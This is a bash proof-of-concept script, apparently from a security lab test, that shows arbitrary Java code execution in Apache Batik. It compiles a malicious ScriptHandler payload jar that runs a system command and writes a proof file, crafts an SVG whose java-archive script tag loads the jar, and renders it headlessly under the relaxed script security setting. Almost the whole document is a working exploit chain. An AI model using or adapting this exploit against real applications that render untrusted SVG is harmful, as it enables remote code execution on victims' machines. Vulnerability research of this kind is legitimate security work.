#!/usr/bin/env bash
# Live-test F-8: application/java-archive <script> -> DocumentJarClassLoader -> ScriptHandler.run() = arbitrary Java code,
# under RelaxedScriptSecurity (SVGUserAgentAdapter, the batik-swing embedding default for scripts). NOT the bare-canvas
# default (that uses DefaultScriptSecurity which blocks java) — this is the embedder-uses-SVGUserAgentAdapter / Squiggle-ANY case.
set -uo pipefail
W=/tmp/batik-lab; cd "$W"
CP=$(printf '%s' "$W/batik-1.19/lib/*")
rm -f /tmp/batik-lab/RCE_PROOF_* 2>/dev/null

# 1) malicious ScriptHandler payload
mkdir -p payload
cat > payload/RCEPayload.java <<'JAVA'
import org.apache.batik.bridge.ScriptHandler;
import org.apache.batik.bridge.Window;
import org.w3c.dom.Document;
public class RCEPayload implements ScriptHandler {
  public void run(Document doc, Window win){
    try {
      String id = "";
      try { Process p = Runtime.getRuntime().exec(new String[]{"id"});
            java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
            id=r.readLine(); } catch(Throwable t){ id="exec-failed:"+t; }
      java.io.FileWriter fw=new java.io.FileWriter("/tmp/batik-lab/RCE_PROOF_java");
      fw.write("RCE via application/java-archive ScriptHandler; id="+id+"\n"); fw.close();
      System.out.println("RCE_PAYLOAD_RAN id="+id);
    } catch(Throwable t){ System.out.println("payload err "+t); }
  }
}
JAVA
javac -cp "$CP" -d payload payload/RCEPayload.java 2>&1 | head -5
mkdir -p payload/META-INF
printf 'Manifest-Version: 1.0\nScript-Handler: RCEPayload\n\n' > payload/META-INF/MANIFEST.MF
( cd payload && jar cfm /tmp/batik-lab/payload.jar META-INF/MANIFEST.MF RCEPayload.class )
echo "payload.jar:"; unzip -l /tmp/batik-lab/payload.jar 2>/dev/null | grep -E "RCEPayload|MANIFEST"

# 2) dynamic SVG referencing the java-archive script
cat > rce.svg <<'SVG'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20" onload="1">
  <script type="application/java-archive" xlink:href="file:///tmp/batik-lab/payload.jar"/>
  <rect width="20" height="20" fill="green"/>
</svg>
SVG

# 3) headless JSVGComponent with SVGUserAgentAdapter (RelaxedScriptSecurity)
cat > RCEProbe.java <<'JAVA'
import org.apache.batik.swing.svg.JSVGComponent;
import org.apache.batik.swing.svg.SVGUserAgentAdapter;
import org.apache.batik.anim.dom.SAXSVGDocumentFactory;
import org.apache.batik.util.XMLResourceDescriptor;
import org.w3c.dom.svg.SVGDocument;
import java.io.*;
public class RCEProbe {
  public static void main(String[] a) throws Exception {
    System.setProperty("java.awt.headless","true");
    String parser=XMLResourceDescriptor.getXMLParserClassName();
    SAXSVGDocumentFactory df=new SAXSVGDocumentFactory(parser);
    SVGDocument doc=df.createSVGDocument("file:///tmp/batik-lab/rce.svg", new FileInputStream("/tmp/batik-lab/rce.svg"));
    JSVGComponent comp=new JSVGComponent(new SVGUserAgentAdapter(), true, true); // RelaxedScriptSecurity
    comp.setSize(20,20);
    comp.setSVGDocument(doc);
    System.out.println("doc set; waiting for UpdateManager -> loadScripts -> java-archive...");
    Thread.sleep(9000);
    System.out.println("DONE_WAIT");
  }
}
JAVA
javac -cp "$CP" RCEProbe.java 2>&1 | head -8
[ -f RCEProbe.class ] || { echo COMPILE_FAIL; exit 1; }
echo "=== run RCEProbe (headless, SVGUserAgentAdapter/Relaxed) ==="
timeout 40 java -cp "$CP:." RCEProbe 2>&1 | grep -iE "RCE_PAYLOAD_RAN|doc set|DONE_WAIT|exception|error|security" | head -8
echo "=== RCE proof file? ==="
ls -la /tmp/batik-lab/RCE_PROOF_java 2>/dev/null && echo "--- contents ---" && cat /tmp/batik-lab/RCE_PROOF_java || echo "NO_PROOF (payload did not run)"
echo END
